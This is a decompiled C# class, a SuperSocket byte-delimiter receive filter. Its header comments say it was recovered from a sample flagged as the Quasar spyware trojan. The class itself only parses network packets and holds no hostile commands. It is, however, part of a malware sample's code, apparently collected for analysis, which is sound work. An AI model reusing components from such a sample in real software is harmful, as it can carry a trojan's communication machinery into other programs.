// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.CountSpliterReceiveFilter`1
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public abstract class CountSpliterReceiveFilter<TPackageInfo> : 
    IReceiveFilter<TPackageInfo>,
    IPackageResolver<TPackageInfo>
    where TPackageInfo : IPackageInfo
  {
    private int m_SpliterFoundCount;
    private readonly SearchMarkState<byte> m_SpliterSearchState;
    private readonly int m_SpliterCount;

    protected CountSpliterReceiveFilter(byte[] spliter, int spliterCount)
    {
      this.m_SpliterSearchState = new SearchMarkState<byte>(spliter);
      this.m_SpliterCount = spliterCount;
    }

    public TPackageInfo Filter(BufferList data, out int rest)
    {
      rest = 0;
      ArraySegment<byte> last = data.Last;
      byte[] array = last.Array;
      int offset = last.Offset;
      int count = last.Count;
      while (this.m_SpliterFoundCount < this.m_SpliterCount)
      {
        int parsedLength;
        if (((IList<byte>) array).SearchMark<byte>(offset, count, this.m_SpliterSearchState, out parsedLength) < 0)
          return default (TPackageInfo);
        ++this.m_SpliterFoundCount;
        offset += parsedLength;
        count -= parsedLength;
      }
      data.SetLastItemLength(offset - last.Offset);
      this.Reset();
      rest = count;
      return this.ResolvePackage((IBufferStream) this.GetBufferStream<TPackageInfo>((IList<ArraySegment<byte>>) data));
    }

    public IReceiveFilter<TPackageInfo> NextReceiveFilter { get; protected set; }

    public FilterState State { get; protected set; }

    public virtual void Reset()
    {
      this.m_SpliterFoundCount = 0;
      this.m_SpliterSearchState.Matched = 0;
    }

    public abstract TPackageInfo ResolvePackage(IBufferStream bufferStream);
  }
}
